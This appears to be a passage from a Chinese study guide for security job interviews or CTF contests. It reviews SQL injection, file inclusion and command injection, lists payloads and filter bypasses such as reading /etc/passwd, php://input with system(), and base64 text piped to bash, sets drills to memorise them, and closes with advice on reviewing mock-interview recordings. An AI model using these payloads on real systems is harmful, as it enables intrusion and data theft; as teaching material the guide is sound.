## 二、核心知识复习

### 2.1 SQL注入知识复习

```
【SQL注入核心知识复习】

一、SQL注入原理
  定义：攻击者通过在输入字段中插入恶意SQL代码，
       从而操作数据库执行非预期的命令。
  
  原理：应用程序将用户输入直接拼接到SQL语句中，
       攻击者可以构造特殊输入来改变SQL语句逻辑。
  
  示例：
    原SQL：SELECT * FROM users WHERE id = '$id'
    输入：1' OR '1'='1
    结果：SELECT * FROM users WHERE id = '1' OR '1'='1'
    效果：返回所有用户数据

二、SQL注入类型
  1. 数字型注入
     - 不需要引号闭合
     - 示例：?id=1 and 1=1
  
  2. 字符型注入
     - 需要引号闭合
     - 示例：?name=admin' and '1'='1
  
  3. 报错注入
     - 利用错误信息获取数据
     - 示例：updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
  
  4. 布尔盲注
     - 通过页面变化判断
     - 示例：?id=1 and length(database())>5
  
  5. 时间盲注
     - 通过响应时间判断
     - 示例：?id=1 and sleep(5)

三、SQL注入Payload速查
  判断注入：
    ?id=1' → 报错
    ?id=1 and 1=1 → 正常
    ?id=1 and 1=2 → 异常
  
  判断列数：
    ?id=1 order by 1
    ?id=1 order by 2
    ...直到报错
  
  联合查询：
    ?id=-1 union select 1,2,3
  
  查库名：
    SELECT schema_name FROM information_schema.schemata
  
  查表名：
    SELECT table_name FROM information_schema.tables 
    WHERE table_schema='库名'
  
  查字段：
    SELECT column_name FROM information_schema.columns 
    WHERE table_name='表名'
  
  查数据：
    SELECT 字段 FROM 表名

四、SQL注入防御
  1. 参数化查询
     - 使用预编译语句
     - 完全杜绝SQL注入
  
  2. 输入过滤
     - 过滤特殊字符
     - 白名单验证
  
  3. 最小权限
     - 数据库用户权限最小化
     - 不使用root用户
  
  4. 错误处理
     - 不显示详细错误信息
     - 使用自定义错误页面
```

### 2.2 文件包含知识复习

```
【文件包含核心知识复习】

一、文件包含原理
  定义：应用程序在包含文件时，没有对文件路径进行严格过滤，
       导致攻击者可以包含任意文件。
  
  类型：
    - LFI（本地文件包含）：包含本地文件
    - RFI（远程文件包含）：包含远程文件

二、文件包含伪协议
  1. php://filter —— 读取源代码
     用法：php://filter/convert.base64-encode/resource=index.php
     效果：将PHP文件用Base64编码输出，可以看到源码
  
  2. php://input —— 执行POST数据
     用法：?file=php://input
     POST：<?php system('ls'); ?>
     效果：执行POST数据中的PHP代码
  
  3. data:// —— 执行数据
     用法：data://text/plain,<?php system('ls');?>
     效果：将数据当作文件内容执行
  
  4. file:// —— 读取本地文件
     用法：file:///etc/passwd
     效果：读取本地绝对路径文件
  
  5. zip:// —— 读取压缩包内文件
     用法：zip://shell.zip%23shell.php
     效果：读取zip压缩包内的文件

三、文件包含绕过技巧
  1. 路径遍历绕过
     过滤../ → 使用....//或..%2f
  
  2. 空字节截断
     后缀限制 → 使用%00截断（PHP<5.3.4）
  
  3. 伪协议绕过
     后缀限制 → 使用php://filter
  
  4. 日志文件包含
     无代码执行 → 包含日志文件（先注入代码到日志）

四、文件包含常见路径
  Linux：
    /etc/passwd
    /var/www/html/index.php
    /var/log/apache2/access.log
    /proc/self/environ
  
  Windows：
    C:\windows\win.ini
    C:\windows\system32\drivers\etc\hosts
```

### 2.3 命令执行知识复习

```
【命令执行核心知识复习】

一、命令执行原理
  定义：应用程序接收用户输入，直接执行系统命令，
       导致攻击者可以执行任意命令。
  
  示例：
    system($_GET['cmd'])
    exec($_GET['cmd'])

二、命令连接符
  1. 分号 ; —— 顺序执行
     用法：cmd1;cmd2
     效果：先执行cmd1，再执行cmd2
  
  2. 管道 | —— 传递输出
     用法：cmd1|cmd2
     效果：cmd1的输出作为cmd2的输入
  
  3. 或运算 || —— 失败才执行
     用法：cmd1||cmd2
     效果：cmd1失败才执行cmd2
  
  4. 与运算 && —— 成功才执行
     用法：cmd1&&cmd2
     效果：cmd1成功才执行cmd2
  
  5. 反引号 ` —— 命令替换
     用法：`cmd`
     效果：执行cmd，结果替换当前位置
  
  6. $() —— 命令替换
     用法：$(cmd)
     效果：同反引号

三、命令执行绕过技巧
  1. 空格绕过
     过滤空格 → 使用$IFS、$IFS$9、${IFS}、%09
     示例：cat$IFS$9/flag
  
  2. 关键字绕过
     过滤cat → 使用ca''t、ca\t、head、more
     示例：ca''t /flag
  
  3. 通配符绕过
     过滤flag → 使用fl*、fl?g、f[a-z]ag
     示例：cat /fl*
  
  4. 编码绕过
     过滤关键字 → 使用Base64编码
     示例：echo "Y2F0IC9mbGFn"|base64 -d|bash
  
  5. 变量拼接
     过滤关键字 → 使用变量拼接
     示例：a=cat;b=/flag;$a $b

四、常用命令
  文件读取：
    cat /flag
    head /flag
    tail /flag
    more /flag
  
  目录操作：
    ls /
    ls -la
    pwd
  
  文件查找：
    find / -name flag
  
  文件写入：
    echo "content" > file
    echo "content" >> file
  
  网络操作：
    curl http://url
    wget http://url
```

```

练习5：查表名Payload
  手写5遍：

    SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='库名'

练习6：查字段Payload
  手写5遍：
    SELECT column_name FROM information_schema.columns WHERE table_name='表名'

练习7：查数据Payload
  手写5遍：
    SELECT 字段 FROM 表名
    SELECT group_concat(字段) FROM 表名

练习8：报错注入Payload
  手写5遍：
    updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
    extractvalue(1,concat(0x7e,(SELECT database()),0x7e))

练习9：盲注Payload
  手写5遍：
    ?id=1 and length(database())>5
    ?id=1 and substr(database(),1,1)='a'

练习10：绕过Payload
  手写5遍：
    ?id=1 ununionion selselectect 1,2,3
    ?id=1 uni%on sel%ect 1,2,3

手写检验：
  每写完一遍，检查是否正确
  如果错误，重新写一遍
  直到连续5遍都正确

## 六、录音录像复盘

### 6.1 复盘的重要性

```
【生活化比喻：运动员看录像】

想象运动员：
  - 比赛后看录像分析
  - 发现自己的问题
  - 针对性改进

面试也是一样：
  - 模拟面试后看录像
  - 发现自己的问题
  - 针对性改进

复盘的作用：
  1. 发现自己看不到的问题
     - 表情、语速、停顿等
     - 录像能客观记录
  
  2. 分析回答的质量
     - 回答是否完整
     - 回答是否清晰
     - 回答是否有逻辑
  
  3. 发现改进点
     - 哪些地方做得好
     - 哪些地方需要改进
     - 如何改进
  
  4. 提升信心
     - 看到自己的进步
     - 发现自己的优势
     - 增强信心
```

### 6.2 复盘方法

```
【复盘方法详解】

步骤1：观看录像
  - 从头到尾完整观看
  - 不要跳过任何部分
  - 注意观察细节

步骤2：记录问题
  - 记录回答不好的问题
  - 记录表达不清楚的地方
  - 记录时间控制不好的地方
  - 记录紧张的表现

步骤3：分析原因
  - 为什么回答不好？
  - 为什么表达不清楚？
  - 为什么时间控制不好？
  - 为什么紧张？

步骤4：制定改进计划
  - 针对每个问题制定改进方法
  - 具体可执行的改进计划
  - 下次模拟面试验证改进效果

步骤5：再次练习
  - 针对薄弱点再次练习
  - 再次模拟面试
  - 再次复盘
  - 循环改进

复盘记录表：
  问题              原因分析          改进方法
  ────────────────────────────────────────────────
  问题1             ______________    ______________
  问题2             ______________    ______________
  问题3             ______________    ______________
  问题4             ______________    ______________
  问题5             ______________    ______________
```

### 6.3 复盘要点

```
【复盘要点】

要点1：观察表达
  - 语速是否合适
  - 声音是否清晰
  - 是否有停顿
  - 是否有重复

要点2：观察内容
  - 回答是否完整
  - 回答是否有逻辑
  - 回答是否有重点
  - 回答是否有拓展

要点3：观察时间
  - 自我介绍是否超时
  - 技术问答是否太长
  - 项目描述是否太长
  - 反向提问是否合适

要点4：观察态度
  - 是否自信
  - 是否紧张
  - 是否积极
  - 是否礼貌

要点5：观察互动
  - 是否和面试官互动
